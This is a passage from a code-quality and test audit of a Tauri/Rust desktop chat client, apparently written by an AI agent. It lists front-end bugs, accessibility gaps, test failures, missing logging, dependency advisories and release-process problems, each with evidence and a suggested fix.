- Kanıt: util.js:228-229: each modal adds `document.addEventListener('keydown', key, true)` and its handler calls `e.stopPropagation(); close()`. stopPropagation does not stop other listeners on the same node, and they run in registration order. So with Settings open plus a confirmDialog (settings.js:135, 174, 459), the OSS licenses modal (settings.js:471), or the MCP config editor (settings.js:589), one Esc first closes Settings and then the top dialog. Routines -> delete confirm (routines.js:78) behaves the same way.
- Düzeltme ipucu: Keep a modal stack in util.js. Close only the top modal on Esc and use stopImmediatePropagation. Also restore focus to the opener on close.

### FE-07 — t() interpolation fills only the first occurrence of a placeholder and expands `$&`/`$'` patterns, so the History 'Explain' prompt sent to Claude is wrong

- Önem: **medium**, efor: **S**
- Dosyalar: `ui/js/i18n.js`
- Kanıt: i18n.js:1253-1256: `s = s.replace(`{${k}}`, v)`. A string pattern replaces only the first match, and the replacement string treats $-patterns specially. hist_explain_p (i18n.js:239, tr 859) uses {sha} twice, and it is sent as a prompt from panes/history.js:92. Running the real t() in node (scratchpad t_check.mjs) with subject "Escape $& and $' in templates" produced: `Explain commit abc1234 ("Escape {subject} and "): run `git show {sha}` and describe ... in templates"): run `git show {sha}` ...`. The literal {sha} remains, and the subject is spliced into the middle.
- Düzeltme ipucu: `s = s.replaceAll(`{${k}}`, () => String(v))`. A function replacer gives every occurrence and turns off $-patterns. Add a unit test.

### FE-08 — Opening a conversation shows no loading state: the previous view stays on screen and partly live while the new one renders

- Önem: **medium**, efor: **S**
- Dosyalar: `ui/js/main.js`, `ui/js/chat.js`
- Kanıt: navigate() calls chat.closeCurrent() (cur = null, main.js:72) and then awaits chat.openConversation (main.js:83). openConversation only clears and draws the view after `await call('get_conversation')` (chat.js:62-68), which 'can take seconds' for long conversations (commands.rs:381). Meanwhile the old conversation is still displayed and clickable. Its composer silently does nothing (sendInConversation: `if (!cur) return false`, chat.js:277). Branch arrows throw `cur.id` on null and show a TypeError toast (chat.js:424).
- Düzeltme ipucu: Clear #view and show a spinner/skeleton synchronously at the start of openConversation (or in navigate), before the await.

### FE-09 — Sidebar and history lists scale with the total number of conversations and artifacts on every refresh

- Önem: **medium**, efor: **M**
- Dosyalar: `ui/js/sidebar.js`, `ui/js/code.js`, `ui/js/artifacts.js`, `src-tauri/src/commands.rs`, `src-tauri/src/db.rs`
- Kanıt: refreshSidebar calls `list_conversations` with no limit after every event burst (sidebar.js:174-191, called from generation-state and conversation-updated in main.js:183-185). Rust does a full scan and returns every conversation plus its `instructions` text (commands.rs:253-276, comment: 'a full scan of the conversations'), yet only 30 are shown (RECENT_LIMIT). The All chats page creates a DOM row for every conversation, with no paging or virtualization (code.js:191, 222-243), so thousands of rows after a claude.ai import. Its search also maps with `all.find` per hit (O(n·m)). The artifact gallery receives the full `content` of up to 500 artifacts to show a 600-char preview (commands.rs:1071-1087; artifacts.js:213, 222).
- Düzeltme ipucu: Add limit/offset (and starred-first) to list_conversations for the sidebar, and drop `instructions` from the list payload. Paginate or virtualize the chats page and index `all` by id. Return a preview slice instead of the content in list_artifacts.

### FE-10 — Per-conversation workspace panes, xterm instances and PTYs are only released when a conversation is deleted

- Önem: **medium**, efor: **M**
- Dosyalar: `ui/js/workspace.js`, `ui/js/panes/terminal.js`, `ui/js/chat.js`
- Kanıt: workspace.js keeps `els` (`${convId}|${paneId}` -> element) forever. Elements are only hidden (workspace.js:114, 128-139). disposeConversation is only called from the delete paths (chat.js:237, code.js:208). Each terminal mount creates an xterm with scrollback 5000 and a backend PTY (terminal.js:100-131), and both live until delete or app exit. Visiting N code sessions with the terminal open keeps N shells and N terminals alive. Changes/Files/History pane DOMs for every visited session also stay attached and hidden in .ws-body.
- Düzeltme ipucu: LRU-dispose the panes of conversations not shown recently (for example keep the last 3). Detach rather than hide inactive pane DOM, and close PTYs of sessions that have not been open for a while, or ask first.

### FE-11 — No automated UI tests: pure, critical JS logic is untested and the turnstream JS fixture is not wired up

- Önem: **medium**, efor: **M**
- Dosyalar: `package.json`, `ui/js/turnstream.js`, `ui/js/keymap.js`, `ui/js/i18n.js`, `ui/js/util.js`, `src-tauri/src/turnstream.rs`
- Kanıt: package.json scripts have only `lint` (eslint, clean). There are no JS tests in the repo. turnstream.rs:601-607 generates a fixture 'for checking ui/js/turnstream.js', but the test is `#[ignore]` and nothing consumes it. I ran it by hand (TURNSTREAM_FIXTURE=... cargo test turnstream::tests::fixture -- --ignored, then scratchpad ts_check.mjs against the real expand()): 383 events, 368 equal, 15 expected nulls, 0 mismatches. So it works today, but only by manual check. keymap.parse/matches, util.morph/snapshot, chat.editedFiles, parts.shellCommands and i18n.t are all pure and untested. The FE-07 bug would have been caught.
- Düzeltme ipucu: Add `node --test` specs under ui/tests (stub window/document as in ts_check.mjs), an `npm test` script, and a CI step that generates the turnstream fixture and checks expand() against it.

### FE-12 — Async search UIs lack request sequencing, so stale results can replace newer ones

- Önem: **low**, efor: **S**
- Dosyalar: `ui/js/search.js`, `ui/js/code.js`, `ui/js/suggest.js`, `ui/js/panes/files.js`
- Kanıt: The palette's run() awaits chatContext, actionItems (which may call slash_list) and `call('search')` with no sequence check before `items = ...; draw()` (search.js:44-84). A slow 'ab' query can land after 'abc'. The All chats draw(q) has the same pattern (code.js:214-243). In suggest.js, close() (19-24, called on blur at 115) does not bump `seq`, so a file_search that resolves after blur passes `my !== seq` (64) and reopens the popup under an unfocused composer. files.js drawFile (163-170) has no seq either: opening file A and then B can show A.
- Düzeltme ipucu: Use the `const my = ++seq; ...; if (my !== seq) return;` pattern already used in files.js:90-98 and history.js:65-69, and bump seq in suggest close().

### FE-13 — Files dropped on Projects, Chats, Artifacts or Sessions pages go into a detached composer and silently vanish

- Önem: **low**, efor: **S**
- Dosyalar: `ui/js/main.js`, `ui/js/composer.js`
- Kanıt: store.activeComposer is set on create and focus (composer.js:474, 517) and never cleared on navigation. The tauri://drag-enter/drop handlers use it unconditionally (main.js:217-225). On pages without a composer (renderProjects, renderChats, renderGallery, renderSessions), a drop calls addPaths on the previous page's detached composer. stage_paths stages the files in the backend, and the user sees no drop highlight, chip or error.
- Düzeltme ipucu: In the handlers, ignore (or toast) when `!c || !c.el.isConnected`, or clear store.activeComposer in navigate().

### FE-14 — Text contrast below WCAG AA for --text-3 and dark-mode error/danger surfaces, and no reduced-motion support

- Önem: **low**, efor: **S**
- Dosyalar: `ui/css/app.css`
- Kanıt: Computed ratios: light --text-3 #898781 on #ffffff = 3.59:1 (3.41 on --bg-1). Dark --text-3 #6f6f6f on #191919 = 3.50:1. It is used for 11-12px text: .composer-note (349), .tool-section .lbl (548), .menu-label (699), .card .f (654), .quick-hint (780), .search-result .d (557). Dark --danger #ef7b7b with white text = 2.70:1 for .toast.error (718) and .btn.danger (263). `grep reduced-motion app.css` finds nothing, despite 10 @keyframes (slidein, shimmer, spinners).
- Düzeltme ipucu: Raise --text-3 to about #767470 (light) and #8a8a8a (dark) for at least 4.5:1, use dark text on dark-mode --danger (or a darker red background), and add `@media (prefers-reduced-motion: reduce){*{animation:none!important;transition:none!important}}`.

### FE-15 — Accessibility basics: modals without focus trap or restore, no live regions, non-focusable 'more' menus, unlabeled icon buttons

- Önem: **low**, efor: **M**
- Dosyalar: `ui/js/util.js`, `ui/js/sidebar.js`, `ui/js/code.js`, `ui/js/projects.js`, `ui/js/findbar.js`, `ui/js/chat.js`, `ui/js/settings.js`
- Kanıt: modal() sets role=dialog/aria-modal but has no aria-labelledby, does not trap Tab (focus can reach the app behind the scrim) and does not restore focus on close (util.js:208-233). Toasts and streamed answers are never announced: there is no aria-live, role=status or role=log anywhere in ui/js. The conversation 'more' triggers are `<span class="icon-btn sm more">` nested inside `<button>`, without tabindex (sidebar.js:200, code.js:152, 225, projects.js:100), so rename/star/delete from a list is mouse-only. Icon-only buttons with no title or aria-label: findbar.js:88 (prev/next/close), chat.js:419 (branch arrows), projects.js:72, 114, 121, settings.js:171.
- Düzeltme ipucu: Add a focus trap, focus restore and aria-labelledby in modal(). Make .toast-root aria-live=polite and announce turn completion. Make 'more' a real sibling button (or add tabindex=0 plus Enter/Space and Shift+F10). Add aria-labels.

### FE-16 — Shortcut hints are hard-coded (ignore rebinding and macOS), and the default workspace toggle Mod+` cannot be typed on some layouts

- Önem: **low**, efor: **S**
- Dosyalar: `ui/js/sidebar.js`, `ui/js/search.js`, `ui/js/workspace.js`, `ui/js/keymap.js`
- Kanıt: The sidebar shows a fixed `${mod}⇧O` and `${mod}K` (sidebar.js:132-133) instead of keymap.shown(). The palette shows 'Ctrl+Shift+O', 'Ctrl+,' and 'Ctrl+/' even on macOS and after rebinding (search.js:141, 146, 152). The workspace button title is a fixed '(Ctrl+`)' (workspace.js:172). keymap.eventKeys only falls back to e.code when e.key is non-ASCII (keymap.js:33-40). On layouts where the Backquote key types an ASCII character other than '`' (for example Turkish Q, where it types '"'), 'Mod+`' never matches.
- Düzeltme ipucu: Use keymap.shown(action) everywhere a hint is printed. For bindings on punctuation keys, also match e.code (Backquote) as an alias, or pick a default that every layout can type.

### FE-17 — Permission prompts have no keyboard path, and the card is removed before the response is confirmed

- Önem: **low**, efor: **S**
- Dosyalar: `ui/js/chat.js`
- Kanıt: showPermission (chat.js:854-919) appends buttons but does not move focus to the card and binds no keys (no Enter = allow once, Esc = deny, 1/2/3 as in Claude Code). Focus stays in the composer, where Enter queues text instead. respond() (chat.js:848-852) removes the card right away and only toasts if respond_permission fails, which leaves the turn waiting with no card to answer.
- Düzeltme ipucu: Focus the primary button when the card appears and add number/Enter/Esc handling scoped to the card. Remove the card in .then() and restore it with an error on failure.

### FE-18 — Composer stubs: 'Add screenshot' is a permanently disabled item, and MCP prompt arguments use window.prompt()

- Önem: **low**, efor: **M**
- Dosyalar: `ui/js/composer.js`
- Kanıt: composer.js:381: `{ label: t('add_screenshot'), icon: 'image', disabled: true }` is a dead control in the attach menu (Claude Desktop can capture a screenshot). composer.js:404 asks for each MCP prompt argument with a native `window.prompt(...)`, one blocking dialog per argument, unstyled and outside the app's theme and i18n, instead of promptDialog/modal from util.js.
- Düzeltme ipucu: Hide the screenshot item until a capture command exists (or implement one via a Rust screen-capture crate). Build one form modal with all of the prompt's arguments (required markers, descriptions).

### FE-19 — Worktree base-branch name is interpolated into HTML unescaped

- Önem: **low**, efor: **S**
- Dosyalar: `ui/js/panes/worktree_actions.js`
- Kanıt: worktree_actions.js:11: ``h(`<button ...>${t('wt_apply', { branch: w.base_branch || 'main' })}</button>`)``. t() does not escape, and git ref names may contain `<`, `>`, `&` and `"`. This was the only real unescaped sink among the 152 template interpolations flagged by the scratchpad html_scan.mjs (the rest are escaped, enums or numbers). Markdown output is sanitized in Rust (raw HTML becomes text, images become links: markdown.rs:273-331). CSP `script-src 'self'` blocks inline handlers, so the impact is markup injection only.
- Düzeltme ipucu: Wrap it in esc(...), like the title attribute on the same line.

### FE-20 — Quick Entry drops the typed text on a failed submit and never follows theme changes

- Önem: **low**, efor: **S**
- Dosyalar: `ui/js/quick.js`
- Kanıt: submit() clears `q.value` before `await call('quick_entry_submit', { text }).catch(() => {})` (quick.js:27-33), so any error loses the text without a message. The theme is set once in init() (quick.js:15-16), with no settings-changed or prefers-color-scheme listener, so the Quick Entry window keeps its old theme after the user switches light/dark until restart.
- Düzeltme ipucu: Clear only after success, restoring the text and showing an error otherwise. Listen to mq 'change' and re-read the theme on 'quick-entry-shown'.

## Test / Build / Kalite

Ölçümler: Commands, all run from D:\ClaudeRust unless noted:
- `npm run lint`: exit 0, 0 warnings. Under eslint:recommended only 4 intentional no-control-regex hits.
- In src-tauri, `cargo check --no-default-features --all-targets`: exit 0.
- `cargo clippy --no-default-features --all-targets -- -D warnings`: exit 0, 0 warnings. Lint suppressions are justified: 8 too_many_arguments, 6 dead_code (platform cfg), 1 unused_assignments on claudecode::run_once.
- `cargo test --no-default-features`: 198 lib tests: 182 passed, 6 failed (5 mcp + 1 hooks, see QA-01), 10 ignored (benches/fixtures), about 11 s. Rerunning `cargo test --lib mcp::` with a real python3 on PATH gives 12/12 passed.
- Default and no-default-features builds are identical: src-tauri/Cargo.toml has no [features] table, and the Tauri CLI adds tauri/custom-protocol itself.
- `cargo audit` (cargo-audit 0.23): 7 vulnerabilities (zip 2.6.1 x6, libsqlite3-sys 0.30.1 x1) and 7 allowed warnings (unmaintained bincode, chrono, proc-macro-error, zbus_names, zvariant, zvariant_derive; unsound glib 0.18, Linux only). cargo-deny is not installed.
- `cargo tree -d`: 99 duplicate entries. The runtime-relevant ones are reqwest 0.12/0.13 and zip 2/9; html5ever, sha2 and syn duplicates are host/proc-macro only.
- Release exe is 26,116,608 bytes.
- Versions: 0.1.0 in Cargo.toml, tauri.conf.json, package.json, Cargo.lock and CHANGELOG. No git tags, no GitHub releases, updater latest.json returns 404, repo is public. The last CI and Build installers runs on main are green.
- Release profile looks right: fat LTO, codegen-units=1, opt-level s with opt-level 3 on hot crates, strip, unwinding kept on purpose for engine.rs:729 catch_unwind.
- tauri.conf.json is sound: identifier dev.clauderust.desktop; updater pubkey plus an https endpoint (guarded by updates.rs:182 test); createUpdaterArtifacts true; Windows passive install; bundle targets all; inline theme script hashed into the CSP automatically; artifact iframe sandboxed without allow-same-origin. Capabilities: one default.json for windows main and quick, core:default plus window/zoom permissions, no plugin JS permissions (the UI calls none).
- Workflows: paths and commands match the repo (target/ at workspace root, universal macOS target added, npm ci with all CLI platform binaries in lockfile v3). The release job takes the signing secrets from a protected environment.
- Test map by module:
  - Zero tests: lib.rs (544 lines: setup, plugins, tray, artifact:// protocol, DB-open recovery offer_fresh_db, quick window), state.rs (112), display.rs (222: WebView flags for RDP/VM, window placement), error.rs (68: AppError -> IPC {message,kind,status}), devtools.rs (48), main.rs.
  - Thin coverage: engine 12 (helpers only), claudecode 8 (helpers only; 727-line run_once untested), commands 9 for 162 commands, import 5, db 7 (no migrations exist), render 5 for 1808 lines.
  - Good coverage: mcp 13 (good once QA-01 is fixed), codetools 12 (check_permission well covered), gitops 15, turnstream 9, anthropic 8 (SSE parsing).
  - UI: 0 tests.
  - 21 tests are Unix-only and 0 are Windows-only.
- IPC names: all 156 UI call() names are registered. 4 registered commands are unused (QA-16).

Kontrol edilmeyenler: - Did not run `tauri build` (read-only audit; the owner's app is running from target\release). I checked the command and config by reading them and by the existing local bundles in target/release/bundle/{msi,nsis}.
- Did not build or test on Linux or macOS, and did not read the Windows CI job logs, so I don't know whether the python3 guard skips the MCP tests there.
- No line-coverage tool was run (llvm-cov and tarpaulin are not installed), so the test map counts tests per module rather than measured coverage.
- Did not compare IPC argument names between JS and Rust; only command names.
- Did not review non-test unwrap/expect calls one by one (59 total, mostly static Regex); left to the stability audit.
- Did not run the dev/mock_api.py manual flow or the app itself, so QA-11 (Windows drag-drop) comes from config, code and Tauri's documentation, not from runtime.
- The GitHub Node 20 runtime deprecation timeline for @v4 actions was not verified; QA-15 relies on the SHA-pinning and concurrency points instead.
- Scratch files used: C:\Users\xldyt\AppData\Local\Temp\claude\b19ddb4b09d05f83\747baec6-ad7e-4440-baa9-57ceec9c11a3\scratchpad\qa_test_full.txt, qa_test_mcp_py.txt, qa_audit.txt, qa_eslint.json and the qa_venv folder. The shared check.txt, clippy.txt and test.txt in that folder were overwritten by other agents running concurrently.

### QA-01 — cargo test is red on the owner's Windows machine: 6 failures from 2 test-isolation bugs, and only 1 of them involves Python

- Önem: **high**, efor: **S**
- Dosyalar: `src-tauri/src/mcp.rs`, `src-tauri/src/hooks.rs`
- Kanıt: `cargo test --no-default-features`: 182 passed, 6 failed, 10 ignored, exit 101. (a) 5 MCP tests fail: stdio_roundtrip_with_fake_server, output_that_isnt_utf8_doesnt_break_the_connection, a_server_that_exits_is_marked_failed_and_fails_fast, a_stopped_call_is_cancelled_and_forgotten and clashing_names_route_to_the_right_tool. The server log reads 'Python was not found; run without arguments to install from the Microsoft Store'. Python 3.14.7 IS installed (C:\Python314\python.exe), but only as `python`. `python3` resolves to the WindowsApps App Execution Alias stub (`where python3` -> C:\Users\xldyt\AppData\Local\Microsoft\WindowsApps\python3.exe). That stub passes the skip guard `which::which("python3").is_err()` (mcp.rs:1422,1471,1495,1560,1579), and fake() hard-codes "python3" (mcp.rs:1403-1405). Verified: with a scratch venv's python copied to python3.exe at the front of PATH, `cargo test --lib mcp::` gives 12 passed, 0 failed. On machines without Python the guard returns early, so a skipped test is reported as 'ok'. (b) hooks::tests::settings_with_a_bom_count_and_broken_ones_are_reported is NOT a Python failure. hooks::load (hooks.rs:135-139) first parses the real ~/.claude/settings.json, and the test asserts events["Stop"][0] (hooks.rs:379). It got the user's global hook instead: left "\"C:/Program Files/nodejs/node.exe\" \"C:/Users/xldyt/.claude/hooks/obsidian-log.js\"", right "echo done".
- Düzeltme ipucu: hooks: assert `cfg.events["Stop"].iter().any(|h| h.command == "echo done")`, or split load into load_from(home: Option<&Path>, cwd, trusted) and pass a temp home in tests. mcp, short term: add `fn python() -> Option<&'static str>` that tries ["python3","python"] by running `-c "import sys"` and checking that it exits 0. Use it in fake() and in the 5 guards, and eprintln a SKIPPED line instead of a silent return. Long term: port FAKE_SERVER (mcp.rs:1344-1386) to a Rust example, src-tauri/examples/fake_mcp.rs (cargo test builds examples), and spawn current_exe().parent().parent().join("examples/fake_mcp"). That removes the Python dependency and gives Windows CI real MCP stdio coverage.

### QA-02 — No log backend and no panic hook: every log::warn!/error!/info! is dropped, and release panics leave no trace

- Önem: **high**, efor: **S**
- Dosyalar: `src-tauri/Cargo.toml`, `src-tauri/src/lib.rs`
- Kanıt: Cargo.toml:58 depends only on the `log` facade. Cargo.lock has none of env_logger, tauri-plugin-log, simplelog, fern, tracing-subscriber, log4rs or flexi_logger, and no source calls log::set_logger/set_boxed_logger. So the 26 log::warn!/error!/info! calls in 11 files are no-ops: lib.rs:280 'opening ... failed' (DB open failure), updates.rs:136 'update check', hooks.rs:81, engine.rs:1495 and others. The release binary uses windows_subsystem = "windows" (main.rs:2), so panic text written to stderr is lost too, and no source has `std::panic::set_hook` (only engine.rs:729 catch_unwind). Claude Desktop keeps main.log plus a log per MCP server. Here a user-reported crash or MCP failure cannot be diagnosed after the fact.
- Düzeltme ipucu: Add tauri-plugin-log (LogDir target, KeepOne/size rotation, Info level, Debug in debug builds) at the start of run() in lib.rs. Add a std::panic::set_hook that logs the payload, location and thread before the default hook. Optionally add an 'Open logs folder' button under Settings -> About (open_path to app_log_dir). MCP server stderr (already kept in ServerStatus.logs) can also go to the log.

### QA-03 — The core turn loops and the permission round trip have no tests, and cannot have any as written (concrete Wry AppHandle)

- Önem: **high**, efor: **L**
- Dosyalar: `src-tauri/src/engine.rs`, `src-tauri/src/claudecode.rs`, `src-tauri/src/commands.rs`
- Kanıt: These functions all take `&AppHandle` (Wry by default), so tauri::test::mock_app() cannot drive them: engine::run (engine.rs:953, about 366 lines), engine::execute_tool (engine.rs:1512, about 210 lines), engine::ask_permission (engine.rs:1432) and claudecode::run_once (claudecode.rs:724-1451, about 727 lines). run_once carries #[allow(unused_assignments)] and 3 macro_rules at lines 998/1024/1042, and holds the 'system' / 'stream_event' / 'control_request' (can_use_tool, line 1248) / 'result' (line 1320) arms. mock_app is already a dev-dependency (Cargo.toml [dev-dependencies] tauri features ["test"]) but is used only in terminal.rs:322. The engine tests cover only pure helpers: build_messages, sanitize, budget, reservation and options. The claudecode tests cover only flags, cost, workflows, history and stopping. Nothing tests: SSE stream -> tool_use -> permission reply -> tool_result -> follow-up request -> DB persist; CLI stream-json -> rows; or the decision mapping 'once'/'session'/'chat'/'always'/'approve'/'approve_edits'/'deny' (engine.rs:1544,1589,1676; claudecode.rs:1493-1573; commands.rs:931-940). The decision vocabulary is repeated as raw strings in all of those places and in ui/js/chat.js:882-888.
- Düzeltme ipucu: Make these functions generic over `R: tauri::Runtime`, as terminal.rs:113 and turnstream.rs:45 already are. Then: (1) add an engine turn test against an in-process fake SSE server (the pattern already exists in the mcp/oai HTTP tests) with mock_app, covering one tool_use that needs permission, answered via respond_permission, and check the DB rows. (2) Move run_once's event match into a pure `fn apply_event(ts: &mut TurnState, ev: &Value) -> Vec<Effect>` and test it with recorded stream-json lines (assistant, tool_use, control_request can_use_tool, result, resume-lost). (3) Replace the decision strings with a serde enum shared by engine and claudecode.

### QA-04 — No schema versioning or migrations in the SQLite store, although the app auto-updates itself

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/db.rs`
- Kanıt: SCHEMA (db.rs:122-180) is only CREATE TABLE/INDEX IF NOT EXISTS. Db::init (db.rs:294-310) never reads or writes PRAGMA user_version and has no ALTER TABLE path. Once a release adds or renames a column, existing installs keep the old table (IF NOT EXISTS skips it), and queries fail at runtime instead of at open. A downgrade (an older MSI over a newer DB) is not detected either. None of the 7 db tests opens an older-shaped database.
- Düzeltme ipucu: Add `const MIGRATIONS: &[&str]` applied in one transaction from user_version+1, treating 0 as the current v1 schema, then set user_version. If user_version is greater than MIGRATIONS.len(), return an error so lib.rs:275 offer_fresh_db handles it. Add a test that builds a v1 DB file, opens it with Db::open and checks the new column.

### QA-05 — cargo audit reports 7 vulnerabilities, and two zip and two reqwest stacks are linked into the binary

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/Cargo.toml`, `Cargo.lock`, `.github/workflows/ci.yml`, `src-tauri/src/extensions.rs`, `src-tauri/src/attachments.rs`, `src-tauri/src/import.rs`
- Kanıt: `cargo audit` ends with 'error: 7 vulnerabilities found!'. zip 2.6.1 has 6: RUSTSEC-2026-0367 (7.3), 0368, 0369 (9.1), 0429 (7.5), 0545, 0548; fixed in >=9.0.5. libsqlite3-sys 0.30.1 has RUSTSEC-2026-0459 (6.8, SQLite < 3.54 WAL uninitialized memory); fixed in >=0.39 (rusqlite 0.41). Reachability today is low. extensions.rs:142-177 extracts entries by hand with enclosed_name, masks the mode `& 0o755 | 0o600` (no suid/sgid), writes no symlinks, and never calls ZipArchive::extract or ZipStreamReader. The AES feature is not compiled (features = ["deflate"]). SQLite opens only its own DB (db.rs:276). Still, `cargo tree -d` shows tauri-plugin-updater 2.14.1 bringing in zip 9.8.1 and reqwest 0.13.5 next to the app's zip 2.6.1 and reqwest 0.12.28, plus base64 0.22/0.23. Both copies end up in the 26.1 MB target/release/clauderust.exe. CI runs no audit.
- Düzeltme ipucu: Bump to zip = { version = "9", default-features = false, features = ["deflate"] } (ZipWriter/SimpleFileOptions call sites in extensions.rs, attachments.rs, import.rs). Bump to reqwest = "0.13", checking the renamed TLS feature names, and to rusqlite 0.41 (bundled). Align base64 to whatever reqwest uses. Add a `cargo audit` step (or rustsec/audit-check) to ci.yml with an ignore list for the Linux-only unmaintained gtk/zbus advisories.

### QA-06 — Release workflow gates nothing: no tests and no tag/version check, and the version is kept in 4 places

- Önem: **medium**, efor: **S**
- Dosyalar: `.github/workflows/release.yml`, `src-tauri/tauri.conf.json`, `src-tauri/src/updates.rs`, `src-tauri/src/display.rs`
- Kanıt: release.yml runs checkout, key check, deps, node, rust, npm ci, notes and tauri-action. It runs no cargo test/clippy and never compares ${GITHUB_REF_NAME#v} with the app version. The version appears in src-tauri/Cargo.toml:3, tauri.conf.json:4, package.json:4 and CHANGELOG.md '## [0.1.0]'. The About/bootstrap payload shows env!("CARGO_PKG_VERSION") (commands.rs:54), while the updater compares app.package_info().version, i.e. tauri.conf.json (updates.rs:52-53). Pushing tag v0.2.0 with tauri.conf.json still at 0.1.0 publishes 0.1.0 installers and a 0.1.0 latest.json, so no installed copy updates. The identifier is also duplicated: display.rs:12 IDENTIFIER = "dev.clauderust.desktop" against tauri.conf.json:5, with no test tying them.
- Düzeltme ipucu: Remove "version" from tauri.conf.json (Tauri 2 then uses Cargo.toml's). In release.yml, add a first job that runs `cargo test -p clauderust --lib` and clippy, plus a step that fails when the tag is not the Cargo.toml version or CHANGELOG.md lacks `## [x.y.z]`. Make the matrix job `needs:` it. In updates.rs tests, assert that CHANGELOG.md contains `[{CARGO_PKG_VERSION}]` and that display::IDENTIFIER equals conf["identifier"].

### QA-07 — 0.1.0 was never tagged or released: the updater manifest and the README download link return 404

- Önem: **medium**, efor: **S**
- Dosyalar: `CHANGELOG.md`, `README.md`
- Kanıt: `git tag` and `git ls-remote --tags origin` are empty, and `gh release list` is empty. `curl -L https://github.com/Cafunw/ClaudeRust/releases/latest/download/latest.json` returns 404 (the endpoint in tauri.conf.json plugins.updater). `gh repo view` reports isPrivate:false, yet README.md:87 and :202 still say the repository is private. CHANGELOG.md:6 says '[0.1.0] - 2026-11-21 ... first public release', and README:72/:208 send users to /releases/latest. Builds installed from the 'Build installers' artifacts show 'Couldn't check for updates' on a manual check (updates.rs:57); background checks fail silently at updates.rs:136.
- Düzeltme ipucu: Set up the 'release' environment secrets, push tag v0.1.0, publish the draft that release.yml creates, and then confirm latest.json returns 200. Drop the 'repository is private' sentences from the README (TR and EN).

### QA-08 — Windows, the owner's platform, has no coverage for process-tree kill, hooks execution or the PTY terminal

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/codetools.rs`, `src-tauri/src/hooks.rs`, `src-tauri/src/terminal.rs`, `src-tauri/src/claudecode.rs`, `src-tauri/src/mcp.rs`, `src-tauri/src/gitops.rs`, `src-tauri/src/worktree.rs`
- Kanıt: 21 tests are gated #[cfg(unix)] or target_os="linux", and none is #[cfg(windows)]. Every stop/timeout kill test is Unix-only: codetools timeout_kills_the_whole_command and background_shell_output_and_kill, hooks runs_commands_with_stdin_and_trust and a_hook_that_times_out_is_stopped_with_everything_it_started (hooks.rs:334,389), gitops/worktree a_command_past_its_time_is_stopped_with_what_it_started, claudecode stopping_the_cli_stops_its_process_group, and mcp shutdown_closes_stdin_then_kills_the_whole_group. The PTY tests are Unix-only too: terminal pty_runs_a_shell, writes_never_block_on_a_program_that_isnt_reading, an_exited_shell_is_forgotten. The Windows path kill_process_tree (codetools.rs:872-878) runs a blocking std::process::Command `taskkill /T /F` from async code (e.g. hooks.rs:269) and is never exercised. taskkill /T only walks live parent links, so children of an intermediate process that already exited survive.
- Düzeltme ipucu: Add #[cfg(windows)] twins: run `powershell -NoProfile -Command "Start-Process -PassThru ping -ArgumentList '-n','60' | % Id > child.pid; Start-Sleep 60"` under a 1 s timeout, then check that the child PID no longer exists (OpenProcess / `tasklist /FI`). Add a ConPTY smoke test (open, write 'echo hi', read). Consider a Job Object with JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE for spawned trees, and run taskkill via spawn_blocking.

### QA-09 — Import flow: branch trees, projects and the MCP merge have no tests

- Önem: **medium**, efor: **M**
- Dosyalar: `src-tauri/src/import.rs`
- Kanıt: The 5 import tests (import.rs:1141-1261) cover: one CC session, artifacts, a two-message linear export, oversized entries and the single-flight guard. Untested: the claude.ai edit-branch tree built from parent_message_uuid (import.rs:707-733; no test JSON contains parent_message_uuid); import_ai_projects with instructions and documents (import.rs:809); desktop_extensions/cc_mcp_servers (850/877); and the MCP config merge, which writes the user's config, inline in the #[tauri::command] import_mcp_servers (import.rs:972-1000, AppHandle-bound, so it cannot be tested).
- Düzeltme ipucu: Add an export fixture with a branch (two children of one parent) and assert the conversation tree and current_leaf. Add a projects.json fixture with docs. Move the merge in import_mcp_servers into a pure `fn merge_servers(ours: &mut Value, theirs: Map, names: Option<&[String]>) -> usize` and test the skip-existing and name-filter cases.

### QA-10 — UI has zero automated tests; README claims e2e checks that are not in the repo, and the JS turnstream decoder is never checked against the Rust encoder

- Önem: **medium**, efor: **M**
- Dosyalar: `ui/js/turnstream.js`, `src-tauri/src/turnstream.rs`, `.github/workflows/ci.yml`, `README.md`
- Kanıt: About 10k lines of ui/js and no test files. README.md:101 and :204 say 'the end-to-end checks drive the app that way under Xvfb against a mock API', but `git ls-files` lists only dev/mock_api.py, dev/fake_mcp_server.py and dev/third_party_licenses.py. No e2e driver is committed and no CI job runs one. ui/js/turnstream.js (72 lines) decodes the delta protocol that turnstream.rs encodes. turnstream.rs:605-608 has an #[ignore] `fixture` test, driven by TURNSTREAM_FIXTURE, that writes payload/full pairs for this check, but nothing in the repo or CI reads that fixture (grep for TURNSTREAM_FIXTURE and node --test finds nothing). Lint is clean: `npm run lint` exits 0, and eslint:recommended flags only 4 intentional no-control-regex hits (code.js:224, search.js:73).
- Düzeltme ipucu: Commit a small generated fixture, or have CI run the ignored Rust test to produce it, and add `node --test ui/test/turnstream.test.mjs` that asserts decode(payload) == full for every entry. Add it to ci.yml on Linux. Commit the CLAUDERUST_EVAL_DIR e2e driver, or remove the claim from the README.

### QA-11 — On Windows, dropping files onto a project's knowledge panel probably does nothing, because dragDropEnabled is on (not confirmed in the app)

- Önem: **medium**, efor: **S**
- Dosyalar: `ui/js/main.js`, `ui/js/projects.js`, `src-tauri/tauri.conf.json`
- Kanıt: tauri.conf.json:22 sets "dragDropEnabled": true. Per Tauri's documentation, that setting delivers OS file drops on Windows as tauri://drag-drop events instead of HTML5 drop events. So the HTML5 handler in ui/js/projects.js:141-149 ('drop files onto knowledge panel (HTML5, when available)') does not fire. The only native handler (ui/js/main.js:219-225) sends p.paths to store.activeComposer.addPaths, or does nothing if no composer is active. Files never reach add_project_paths. I did not run the app to confirm this.
- Düzeltme ipucu: In the main.js tauri://drag-drop handler, when the project knowledge panel is open (e.g. a store.activeProjectDrop callback that projects.js registers), call add_project_paths with p.paths and rerender. Keep the HTML5 path for macOS/Linux.

### QA-12 — Declared MSRV is false: rust-version 1.80, but the resolved dependencies need Rust 1.91

- Önem: **low**, efor: **S**
- Dosyalar: `src-tauri/Cargo.toml`
- Kanıt: src-tauri/Cargo.toml:7 has rust-version = "1.80". `cargo metadata` shows notify-types 2.3.1 needs 1.91, tauri/tauri-build/tauri-plugin-* 2.12.x/2.7.x need 1.90, and 68 resolved crates use edition 2024. Anyone on 1.80-1.90 gets confusing errors in dependencies instead of a clear MSRV message.
